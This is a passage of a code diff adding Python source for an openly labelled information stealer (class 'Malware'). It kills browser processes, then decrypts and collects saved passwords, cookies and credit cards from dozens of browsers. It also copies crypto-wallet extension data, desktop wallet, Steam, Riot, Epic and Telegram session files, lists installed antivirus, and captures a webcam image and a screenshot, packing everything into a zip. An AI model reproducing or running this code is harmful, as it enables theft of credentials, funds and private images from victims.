+                            zip_file.write(item_path, os.path.join(other_folder_path, item))
+
+        browser_files = [
+            ("Google Chrome",          os.path.join(path_appdata_local,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
+            ("Google Chrome SxS",      os.path.join(path_appdata_local,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
+            ("Google Chrome Beta",     os.path.join(path_appdata_local,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
+            ("Google Chrome Dev",      os.path.join(path_appdata_local,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
+            ("Google Chrome Unstable", os.path.join(path_appdata_local,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
+            ("Google Chrome Canary",   os.path.join(path_appdata_local,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
+            ("Microsoft Edge",         os.path.join(path_appdata_local,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
+            ("Opera",                  os.path.join(path_appdata_roaming, "Opera Software", "Opera Stable"),                "opera.exe"),
+            ("Opera GX",               os.path.join(path_appdata_roaming, "Opera Software", "Opera GX Stable"),             "opera.exe"),
+            ("Opera Neon",             os.path.join(path_appdata_roaming, "Opera Software", "Opera Neon"),                  "opera.exe"),
+            ("Brave",                  os.path.join(path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
+            ("Vivaldi",                os.path.join(path_appdata_local,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
+            ("Internet Explorer",      os.path.join(path_appdata_local,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
+            ("Amigo",                  os.path.join(path_appdata_local,   "Amigo", "User Data"),                            "amigo.exe"),
+            ("Torch",                  os.path.join(path_appdata_local,   "Torch", "User Data"),                            "torch.exe"),
+            ("Kometa",                 os.path.join(path_appdata_local,   "Kometa", "User Data"),                           "kometa.exe"),
+            ("Orbitum",                os.path.join(path_appdata_local,   "Orbitum", "User Data"),                          "orbitum.exe"),
+            ("Cent Browser",           os.path.join(path_appdata_local,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
+            ("7Star",                  os.path.join(path_appdata_local,   "7Star", "7Star", "User Data"),                   "7star.exe"),
+            ("Sputnik",                os.path.join(path_appdata_local,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
+            ("Epic Privacy Browser",   os.path.join(path_appdata_local,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
+            ("Uran",                   os.path.join(path_appdata_local,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
+            ("Yandex",                 os.path.join(path_appdata_local,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
+            ("Yandex Canary",          os.path.join(path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
+            ("Yandex Developer",       os.path.join(path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
+            ("Yandex Beta",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
+            ("Yandex Tech",            os.path.join(path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
+            ("Yandex SxS",             os.path.join(path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
+            ("Iridium",                os.path.join(path_appdata_local,   "Iridium", "User Data"),                          "iridium.exe"),
+            ("Mozilla Firefox",        os.path.join(path_appdata_roaming, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
+            ("Safari",                 os.path.join(path_appdata_roaming, "Apple Computer", "Safari"),                      "safari.exe"),
+        ]
+
+        profiles = [
+            '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
+        ]
+
+        extensions_names = [
+            ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
+            ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
+            ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
+            ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
+            ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
+            ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
+            ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
+            ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
+            ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
+            ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
+            ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
+            ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
+            ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
+            ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
+            ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
+            ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
+            ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
+            ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
+            ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
+            ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
+            ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
+            ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
+            ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
+            ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
+            ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
+            ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
+            ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
+            ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
+            ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
+            ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
+            ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
+            ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
+            ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
+            ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
+            ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
+            ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
+            ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
+            ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
+            ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
+            ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
+            ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
+            ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
+            ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
+            ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
+        ]
+        
+        try:
+            for name, path, proc_name in browser_files:
+                for proc in psutil.process_iter(['pid', 'name']):
+                    try:
+                        if proc.name().lower() == proc_name.lower():
+                            proc.kill()
+                    except:
+                        pass
+        except:
+            pass
+
+        for name, path, proc_name in browser_files:
+            if not os.path.exists(path):
+                continue
+
+            master_key = GetMasterKey(os.path.join(path, 'Local State'))
+            if not master_key:
+                continue
+
+            for profile in profiles:
+                profile_path = os.path.join(path, profile)
+                if not os.path.exists(profile_path):
+                    continue
+
+            for profile in profiles:
+                profile_path = os.path.join(path, profile)
+                if not os.path.exists(profile_path):
+                    continue
+                
+                if "extentions" in browser_choice:
+                    try:
+                        GetExtentions(zip_file, extensions_names, name, profile_path)
+                    except:
+                        pass
+
+                if "passwords" in browser_choice:
+                    try:
+                        GetPasswords(name, profile_path, master_key)
+                    except:
+                        pass
+
+                if "cookies" in browser_choice:
+                    try:
+                        GetCookies(name, profile_path, master_key)
+                    except:
+                        pass
+
+                if "history" in browser_choice:
+                    try:
+                        GetHistory(name, profile_path)
+                    except:
+                        pass
+
+                if "downloads" in browser_choice:
+                    try:
+                        GetDownloads(name, profile_path)
+                    except:
+                        pass
+
+                if "cards" in browser_choice:
+                    try:
+                        GetCards(name, profile_path, master_key)
+                    except:
+                        pass
+
+                if name not in browsers:
+                    browsers.append(name)
+
+        if "passwords" in browser_choice:
+            if not file_passwords:
+                file_passwords.append("No passwords was saved on the victim's computer.")
+            file_passwords = "\n".join(file_passwords)
+
+        if "cookies" in browser_choice:
+            if not file_cookies:
+                file_cookies.append("No cookies was saved on the victim's computer.")
+            file_cookies   = "\n".join(file_cookies)
+
+        if "history" in browser_choice:
+            if not file_history:
+                file_history.append("No history was saved on the victim's computer.")
+            file_history   = "\n".join(file_history)
+
+        if "downloads" in browser_choice:
+            if not file_downloads:
+                file_downloads.append("No downloads was saved on the victim's computer.")
+            file_downloads = "\n".join(file_downloads)
+
+        if "cards" in browser_choice:
+            if not file_cards:
+                file_cards.append("No cards was saved on the victim's computer.")
+            file_cards     = "\n".join(file_cards)
+        
+        if number_passwords != None:
+            zip_file.writestr(f"Passwords ({number_passwords}).txt", file_passwords)
+
+        if number_cookies != None:
+            zip_file.writestr(f"Cookies ({number_cookies}).txt", file_cookies)
+
+        if number_cards != None:
+            zip_file.writestr(f"Cards ({number_cards}).txt", file_cards)
+
+        if number_history != None:
+            zip_file.writestr(f"Browsing History ({number_history}).txt", file_history)
+
+        if number_downloads != None:
+            zip_file.writestr(f"Download History ({number_downloads}).txt",file_downloads)
+
+        return number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards
+
+    @staticmethod
+    def AntiVirus_Infos(zip_file):
+        path_program_files = Paths().program_files
+        path_program_files_x86 = Paths().program_files_x86
+        antivirus_list = [
+            "Avast Antivirus",
+            "AVG Antivirus",
+            "Avira Antivirus",
+            "Bitdefender Antivirus",
+            "Kaspersky Antivirus",
+            "McAfee Antivirus",
+            "Norton Antivirus",
+            "ESET NOD32 Antivirus",
+            "Trend Micro Antivirus",
+            "Windows Defender",
+            "Malwarebytes",
+            "Sophos Home",
+            "Panda Dome",
+            "F-Secure SAFE",
+            "Webroot SecureAnywhere",
+            "BullGuard Antivirus",
+            "ZoneAlarm Free Antivirus",
+            "Adaware Antivirus",
+            "Comodo Antivirus",
+            "360 Total Security"
+        ]
+
+        found_antivirus = []
+
+        for antivirus in antivirus_list:
+            paths_to_check = [
+                os.path.join(path_program_files, antivirus),
+                os.path.join(path_program_files_x86, antivirus)
+            ]
+            for path in paths_to_check:
+                if os.path.exists(path):
+                    found_antivirus.append(antivirus)
+                    break
+
+        if found_antivirus:
+            antivirus_info = "Antivirus software found on the system:\n- " + "\n- ".join(found_antivirus)
+        else:
+            antivirus_info = "No antivirus software found on the system."
+
+        zip_file.writestr("Antivirus Info.txt", antivirus_info)
+
+        return len(found_antivirus)
+
+    @staticmethod
+    def Session_files(zip_file, session_files_choice):
+        path_appdata_roaming   = Paths().appdata_roaming
+        path_appdata_local     = Paths().appdata_local
+        path_program_files = Paths().program_files
+
+        name_game_launchers  = [] if "Game Launchers" in session_files_choice else None
+        name_wallets         = [] if "Wallets" in session_files_choice else None
+        name_apps            = [] if "Apps" in session_files_choice else None
+
+        session_files = [
+            ("Zcash",             os.path.join(path_appdata_roaming,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
+            ("Armory",            os.path.join(path_appdata_roaming,   "Armory"),                                                     "armory.exe",            "Wallets"),
+            ("Bytecoin",          os.path.join(path_appdata_roaming,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
+            ("Guarda",            os.path.join(path_appdata_roaming,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
+            ("Atomic Wallet",     os.path.join(path_appdata_roaming,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
+            ("Exodus",            os.path.join(path_appdata_roaming,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
+            ("Binance",           os.path.join(path_appdata_roaming,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
+            ("Jaxx Liberty",      os.path.join(path_appdata_roaming,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
+            ("Electrum",          os.path.join(path_appdata_roaming,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
+            ("Coinomi",           os.path.join(path_appdata_roaming,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
+            ("Trust Wallet",      os.path.join(path_appdata_roaming,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
+            ("AtomicDEX",         os.path.join(path_appdata_roaming,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
+            ("Wasabi Wallet",     os.path.join(path_appdata_roaming,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
+            ("Ledger Live",       os.path.join(path_appdata_roaming,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
+            ("Trezor Suite",      os.path.join(path_appdata_roaming,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
+            ("Blockchain Wallet", os.path.join(path_appdata_roaming,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
+            ("Mycelium",          os.path.join(path_appdata_roaming,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
+            ("Crypto.com",        os.path.join(path_appdata_roaming,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
+            ("BRD",               os.path.join(path_appdata_roaming,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
+            ("Coinbase Wallet",   os.path.join(path_appdata_roaming,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
+            ("Zerion",            os.path.join(path_appdata_roaming,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
+            ("Steam",             os.path.join(path_program_files,     "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
+            ("Riot Games",        os.path.join(path_appdata_local,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
+            ("Epic Games",        os.path.join(path_appdata_local,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
+            ("Rockstar Games",    os.path.join(path_appdata_local,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
+            ("Telegram",          os.path.join(path_appdata_roaming,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
+        ]
+
+        try:
+            for name, path, proc_name, type in session_files:
+                if type in session_files_choice:
+                    for proc in psutil.process_iter(['pid', 'name']):
+                        try:
+                            if proc.info['name'].lower() == proc_name.lower():
+                                proc.kill()
+                        except:
+                            pass
+        except:
+            pass
+
+        for name, path, proc_name, type in session_files:
+            if type in session_files_choice and os.path.exists(path):
+                try:
+                    if type == "Wallets" and name_wallets is not None:
+                        name_wallets.append(name)
+                    elif type == "Game Launchers" and name_game_launchers is not None:
+                        name_game_launchers.append(name)
+                    elif type == "Apps" and name_apps is not None:
+                        name_apps.append(name)
+
+                    zip_file.writestr(os.path.join("Session Files", name, "path.txt"), path)
+
+                    if os.path.isdir(path):
+                        for root, _, files in os.walk(path):
+                            for file in files:
+                                abs_file_path = os.path.join(root, file)
+                                rel_path_in_zip = os.path.join(
+                                    "Session Files", name, "Files",
+                                    os.path.relpath(abs_file_path, path)
+                                )
+                                try:
+                                    zip_file.write(abs_file_path, rel_path_in_zip)
+                                except:
+                                    pass
+                    else:
+                        rel_path_in_zip = os.path.join("Session Files", name, "Files", os.path.basename(path))
+                        try:
+                            zip_file.write(path, rel_path_in_zip)
+                        except:
+                            pass
+                except:
+                    pass
+
+        if "Wallets" in session_files_choice:
+            name_wallets = ", ".join(name_wallets) if name_wallets else "No"
+        if "Game Launchers" in session_files_choice:
+            name_game_launchers = ", ".join(name_game_launchers) if name_game_launchers else "No"
+        if "Apps" in session_files_choice:
+            name_apps = ", ".join(name_apps) if name_apps else "No"
+
+        return name_wallets, name_game_launchers, name_apps
+
+    @staticmethod
+    def Webcam(zip_file):
+        path_temp = Paths().temp
+        webcam_image_path = os.path.join(path_temp, "webcam_capture.png")
+
+        try:
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            if ret:
+                cv2.imwrite(webcam_image_path, frame)
+                zip_file.write(webcam_image_path, os.path.join("Webcam", "webcam_capture.png"))
+            cap.release()
+            cv2.destroyAllWindows()
+        except:
+            pass
+
+        if os.path.exists(webcam_image_path):
+            Malware().delete_file(webcam_image_path)
+            return True
+        else:
+            return False
+
+    @staticmethod
+    def Screenshot(zip_file):
+        path_temp = Paths().temp
+        screenshot_image_path = os.path.join(path_temp, "screenshot_capture.png")
+
+        try:
+            user32 = ctypes.windll.user32
+            width = user32.GetSystemMetrics(0)
+            height = user32.GetSystemMetrics(1)
+
+            import PIL.ImageGrab
+            screenshot = PIL.ImageGrab.grab(bbox=(0, 0, width, height))
+            screenshot.save(screenshot_image_path)
+
+            zip_file.write(screenshot_image_path, os.path.join("Screenshot", "screenshot_capture.png"))
+        except:
+            pass
+
+        if os.path.exists(screenshot_image_path):
+            Malware().delete_file(screenshot_image_path)
+            return True
+        else:
+            return False
+
+
+if __name__ == "__main__":
+    malware = Malware()
+    malware.main()
